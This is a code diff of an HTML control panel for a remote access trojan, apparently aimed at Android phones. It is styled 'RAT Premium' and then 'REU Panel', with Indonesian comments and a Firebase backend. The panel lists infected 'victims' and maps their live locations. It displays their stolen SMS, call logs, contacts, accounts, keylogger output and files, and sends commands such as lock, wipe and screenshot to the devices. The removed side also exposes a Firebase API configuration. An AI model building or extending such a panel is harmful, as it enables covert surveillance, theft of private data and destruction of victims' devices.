@@ -1,291 +1,194 @@
+<!-- Path: /panel/dashboard.html -->
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard - RAT Premium</title>
-    <link rel="stylesheet" href="css/style.css">
-    <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
-    <!-- Chart.js -->
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-    <style>
-        /* Loading screen */
-        .loading-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #f5f6fa;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 9999;
-        }
-        .loading-spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #3498db;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        /* Dashboard styles */
-        .dashboard { display: flex; min-height: 100vh; }
-        .sidebar { width: 260px; background: #2c3e50; color: white; display: flex; flex-direction: column; }
-        .sidebar-header { padding: 20px; border-bottom: 1px solid #34495e; }
-        .sidebar-header h2 { font-size: 20px; }
-        .sidebar-header h2 span { font-size: 12px; color: #3498db; margin-left: 5px; }
-        .sidebar-nav { flex: 1; padding: 20px 0; }
-        .nav-item { display: flex; align-items: center; padding: 12px 20px; color: #ecf0f1; text-decoration: none; }
-        .nav-item:hover { background: #34495e; }
-        .nav-item.active { background: #3498db; }
-        .nav-item .icon { width: 30px; font-size: 18px; }
-        .nav-item .text { flex: 1; }
-        .sidebar-footer { padding: 20px; border-top: 1px solid #34495e; }
-        .user-info { margin-bottom: 10px; font-size: 13px; color: #bdc3c7; }
-        .btn-logout { width: 100%; padding: 8px; background: #e74c3c; border: none; border-radius: 5px; color: white; cursor: pointer; }
-        .main-content { flex: 1; background: #f5f6fa; display: flex; flex-direction: column; }
-        .content-header { background: white; padding: 20px; display: flex; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .content-header h1 { flex: 1; font-size: 24px; color: #2c3e50; }
-        .badge { background: #3498db; color: white; padding: 5px 10px; border-radius: 20px; font-size: 12px; }
-        .content-body { flex: 1; padding: 20px; overflow-y: auto; }
-    </style>
+    <title>Dashboard • REU Panel</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 </head>
 <body>
-    <!-- Loading Screen -->
-    <div id="loadingScreen" class="loading-screen">
-        <div class="loading-spinner"></div>
+    <nav class="navbar">
+        <div class="nav-brand">REU MONITOR</div>
+        <div class="nav-menu">
+            <a href="#" class="active">Dashboard</a>
+            <a href="#" onclick="loadVictims()">Victims</a>
+            <a href="#" onclick="loadCommands()">Commands</a>
+            <a href="profile.html">Profile</a>
+            <button onclick="logout()" class="btn-logout">Logout</button>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="stats-grid">
+            <div class="stat-card">
+                <h3>Total Devices</h3>
+                <p id="totalDevices">0</p>
+            </div>
+            <div class="stat-card">
+                <h3>Online Now</h3>
+                <p id="onlineDevices">0</p>
+            </div>
+            <div class="stat-card">
+                <h3>Today's Data</h3>
+                <p id="todayData">0 MB</p>
+            </div>
+        </div>
+
+        <div class="main-grid">
+            <div class="victims-list card">
+                <h2>📱 Connected Devices</h2>
+                <div id="victimsContainer"></div>
+            </div>
+            
+            <div class="live-location card">
+                <h2>📍 Live Locations</h2>
+                <div id="map" style="height: 300px;"></div>
+            </div>
+        </div>
+
+        <div class="data-panel card">
+            <h2>📊 Real-time Data</h2>
+            <div class="data-tabs">
+                <button onclick="showData('sms')" class="tab-btn active">SMS</button>
+                <button onclick="showData('calls')" class="tab-btn">Calls</button>
+                <button onclick="showData('notif')" class="tab-btn">Notifications</button>
+                <button onclick="showData('contacts')" class="tab-btn">Contacts</button>
+                <button onclick="showData('accounts')" class="tab-btn">Accounts</button>
+                <button onclick="showData('keylog')" class="tab-btn">Keylogger</button>
+                <button onclick="showData('files')" class="tab-btn">Files</button>
+            </div>
+            <div id="dataContent" class="data-content"></div>
+        </div>
     </div>
 
-    <div class="dashboard" id="dashboardContent" style="display: none;">
-        <!-- Sidebar -->
-        <aside class="sidebar">
-            <div class="sidebar-header">
-                <h2>🔮 RAT<span>Premium</span></h2>
-            </div>
-            
-            <nav class="sidebar-nav">
-                <a href="#" class="nav-item active" data-page="dashboard">
-                    <span class="icon">📊</span>
-                    <span class="text">Dashboard</span>
-                </a>
-                <a href="#" class="nav-item" data-page="victims">
-                    <span class="icon">👥</span>
-                    <span class="text">Victims</span>
-                </a>
-                <a href="#" class="nav-item" data-page="profile">
-                    <span class="icon">👤</span>
-                    <span class="text">Profile</span>
-                </a>
-            </nav>
-            
-            <div class="sidebar-footer">
-                <div class="user-info" id="userInfo">
-                    <span class="user-email">loading...</span>
-                </div>
-                <button class="btn-logout" id="logoutBtn">🚪 Logout</button>
-            </div>
-        </aside>
-        
-        <!-- Main Content -->
-        <main class="main-content">
-            <header class="content-header">
-                <h1 id="pageTitle">Dashboard</h1>
-                <span class="badge" id="victimCount">0 victims</span>
-            </header>
-            
-            <div class="content-body" id="contentBody">
-                <div style="text-align: center; padding: 50px;">Loading dashboard...</div>
-            </div>
-        </main>
-    </div>
-
+    <script src="firebase-config.js"></script>
     <script>
-        // Firebase Config
-        const firebaseConfig = {
-            apiKey: "AIzaSyDzA92c3IoyjhiFft3Ci6cpsvEJBXAzIfQ",
-            authDomain: "jaxrat-6813c.firebaseapp.com",
-            databaseURL: "https://jaxrat-6813c-default-rtdb.firebaseio.com",
-            projectId: "jaxrat-6813c",
-            storageBucket: "jaxrat-6813c.firebasestorage.app",
-            messagingSenderId: "750985295231",
-            appId: "1:750985295231:web:0679d4b998e52256e4d64a"
-        };
-
-        // Initialize Firebase
-        firebase.initializeApp(firebaseConfig);
-
-        // Global variables
-        let currentUser = null;
-        let isOwner = false;
-        let victimsRef = null;
-
-        // CHECK AUTHENTICATION FIRST - SEBELUM LOAD ANYTHING
-        (async function() {
-            try {
-                // Cek session storage
-                const isLoggedIn = sessionStorage.getItem('isLoggedIn');
-                const userUid = sessionStorage.getItem('userUid');
-                
-                console.log('Session check:', { isLoggedIn, userUid });
-                
-                if (!isLoggedIn || !userUid) {
-                    console.log('No session, redirecting to login');
-                    window.location.replace('index.html');
-                    return;
-                }
-                
-                // Cek Firebase current user
-                const user = firebase.auth().currentUser;
-                
-                if (!user) {
-                    console.log('No Firebase user, trying to restore session');
-                    
-                    // Coba tunggu bentar
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                    
-                    const currentUser2 = firebase.auth().currentUser;
-                    if (!currentUser2) {
-                        console.log('No Firebase user after wait, redirecting');
-                        sessionStorage.removeItem('isLoggedIn');
-                        window.location.replace('index.html');
-                        return;
-                    }
-                }
-                
-                // User valid, proceed
-                console.log('User authenticated:', user?.uid || userUid);
-                
-                // Sembunyikan loading screen, tampilkan dashboard
-                document.getElementById('loadingScreen').style.display = 'none';
-                document.getElementById('dashboardContent').style.display = 'flex';
-                
-                // Set current user
-                currentUser = user || { uid: userUid, email: sessionStorage.getItem('userEmail') };
-                
-                // Cek owner
-                const ownerSnapshot = await firebase.database().ref('settings/owner_uid').once('value');
-                isOwner = (currentUser.uid === ownerSnapshot.val());
-                
-                // Tampilkan user info
-                document.getElementById('userInfo').querySelector('.user-email').textContent = currentUser.email || 'User';
-                
-                // Load default page
-                loadPage('dashboard');
-                
-                // Setup listeners
-                setupRealtimeListeners(currentUser.uid);
-                
-            } catch (error) {
-                console.error('Auth check error:', error);
-                sessionStorage.removeItem('isLoggedIn');
-                window.location.replace('index.html');
-            }
-        })();
-
-        // Setup Firebase listeners
-        function setupRealtimeListeners(uid) {
-            // Listen to victims
-            if (isOwner) {
-                victimsRef = firebase.database().ref('victims');
-            } else {
-                victimsRef = firebase.database().ref(`victims/${uid}`);
-            }
-            
+        const urlParams = new URLSearchParams(window.location.search);
+        const currentUid = urlParams.get('uid');
+        
+        // Cek apakah owner
+        const OWNER_UID = 'OWNER_UID_MU'; // Ganti dengan UID firebasemu
+        
+        // Load victims
+        function loadVictims() {
+            const victimsRef = db.ref('victims/' + currentUid);
             victimsRef.on('value', (snapshot) => {
                 const victims = snapshot.val() || {};
-                const victimCount = Object.keys(victims).length;
-                document.getElementById('victimCount').textContent = `${victimCount} victims`;
+                document.getElementById('totalDevices').textContent = Object.keys(victims).length;
+                
+                let html = '';
+                for (const [deviceId, data] of Object.entries(victims)) {
+                    html += `
+                        <div class="victim-item">
+                            <div class="victim-header">
+                                <span class="device-name">${data.info?.deviceName || 'Unknown'}</span>
+                                <span class="status ${data.online ? 'online' : 'offline'}">${data.online ? '🟢 Online' : '⚫ Offline'}</span>
+                            </div>
+                            <div class="victim-details">
+                                <p>📱 ${data.info?.model || 'N/A'} | ${data.info?.os || 'N/A'}</p>
+                                <p>🔋 ${data.info?.battery || 'N/A'}% | ${data.info?.country || 'N/A'}</p>
+                                <button onclick="viewDevice('${deviceId}')">View Details</button>
+                                <button onclick="sendCommand('${deviceId}')">Send Command</button>
+                            </div>
+                        </div>
+                    `;
+                }
+                document.getElementById('victimsContainer').innerHTML = html || '<p>No victims yet</p>';
             });
         }
 
-        // Load page function
-        function loadPage(page) {
-            const contentBody = document.getElementById('contentBody');
-            const titles = {
-                'dashboard': 'Dashboard',
-                'victims': 'Victims List',
-                'profile': 'Profile'
-            };
-            
-            document.getElementById('pageTitle').textContent = titles[page] || 'Dashboard';
-            
-            // Update active nav
-            document.querySelectorAll('.nav-item').forEach(item => {
-                if (item.dataset.page === page) {
-                    item.classList.add('active');
-                } else {
-                    item.classList.remove('active');
-                }
+        // Live location map
+        let map;
+        const markers = {};
+
+        function initMap() {
+            map = L.map('map').setView([-6.2088, 106.8456], 13);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                attribution: '© OpenStreetMap'
+            }).addTo(map);
+
+            // Subscribe ke lokasi semua victims
+            const victimsRef = db.ref('victims/' + currentUid);
+            victimsRef.on('child_added', (snapshot) => {
+                const deviceId = snapshot.key;
+                const locRef = db.ref(`devices/${deviceId}/location`);
+                
+                locRef.on('value', (locSnap) => {
+                    const loc = locSnap.val();
+                    if (loc && loc.lat && loc.lng) {
+                        if (markers[deviceId]) {
+                            markers[deviceId].setLatLng([loc.lat, loc.lng]);
+                        } else {
+                            markers[deviceId] = L.marker([loc.lat, loc.lng])
+                                .bindPopup(`Device: ${deviceId}`)
+                                .addTo(map);
+                        }
+                        map.setView([loc.lat, loc.lng], 15);
+                    }
+                });
             });
-            
-            // Load content based on page
-            if (page === 'profile') {
-                window.location.href = 'profile.html';
-                return;
-            }
-            
-            // Simple content for demo
-            contentBody.innerHTML = `
-                <div style="background: white; padding: 20px; border-radius: 10px;">
-                    <h2>Welcome to ${titles[page]}</h2>
-                    <p>Page loaded successfully. No more refresh loops!</p>
-                    <p>User UID: ${currentUser?.uid || 'Unknown'}</p>
-                    <p>Is Owner: ${isOwner}</p>
-                </div>
-            `;
         }
 
-        // Navigation
-        document.querySelectorAll('.nav-item').forEach(item => {
-            item.addEventListener('click', (e) => {
-                e.preventDefault();
-                const page = item.dataset.page;
-                loadPage(page);
-            });
-        });
-
-        // Logout function
-        document.getElementById('logoutBtn').addEventListener('click', async (e) => {
-            e.preventDefault();
+        // Show different data types
+        function showData(type) {
+            const contentDiv = document.getElementById('dataContent');
             
-            try {
-                // Clean up listeners
-                if (victimsRef) {
-                    victimsRef.off();
-                }
-                
-                // Sign out
-                await firebase.auth().signOut();
-                
-                // Clear session
-                sessionStorage.removeItem('isLoggedIn');
-                sessionStorage.removeItem('userUid');
-                sessionStorage.removeItem('userEmail');
-                
-                // Redirect
-                window.location.replace('index.html');
-                
-            } catch (error) {
-                console.error('Logout error:', error);
-                // Force redirect
-                sessionStorage.clear();
-                window.location.replace('index.html');
-            }
-        });
+            // Hapus class active dari semua tab
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            event.target.classList.add('active');
 
-        // Prevent back button after logout
-        window.addEventListener('pageshow', function(event) {
-            if (event.persisted) {
-                window.location.reload();
+            // Load data berdasarkan tipe
+            const dataRef = db.ref('devices').orderByChild('attacker_uid').equalTo(currentUid);
+            
+            dataRef.once('value', (snapshot) => {
+                let html = '<table class="data-table">';
+                
+                snapshot.forEach((deviceSnap) => {
+                    const deviceId = deviceSnap.key;
+                    const deviceData = deviceSnap.val();
+                    
+                    if (deviceData[type]) {
+                        Object.entries(deviceData[type]).forEach(([key, value]) => {
+                            html += '<tr>';
+                            if (type === 'sms') {
+                                html += `<td>${value.from}</td><td>${value.body}</td><td>${value.date}</td>`;
+                            } else if (type === 'location') {
+                                html += `<td>${value.lat}, ${value.lng}</td><td>${value.accuracy}m</td><td>${value.time}</td>`;
+                            } else if (type === 'keylog') {
+                                html += `<td colspan="3">${value.text}</td>`;
+                            }
+                            html += '</tr>';
+                        });
+                    }
+                });
+                
+                html += '</table>';
+                contentDiv.innerHTML = html || '<p>No data available</p>';
+            });
+        }
+
+        // Send command ke device
+        function sendCommand(deviceId) {
+            const command = prompt('Enter command (lock, wipe, location, screenshot, etc):');
+            if (command) {
+                const cmdRef = db.ref(`commands/${deviceId}`).push();
+                cmdRef.set({
+                    command: command,
+                    timestamp: Date.now(),
+                    status: 'pending'
+                });
+                alert('Command sent!');
             }
-        });
+        }
+
+        // Inisialisasi
+        loadVictims();
+        initMap();
     </script>
 </body>
 </html>
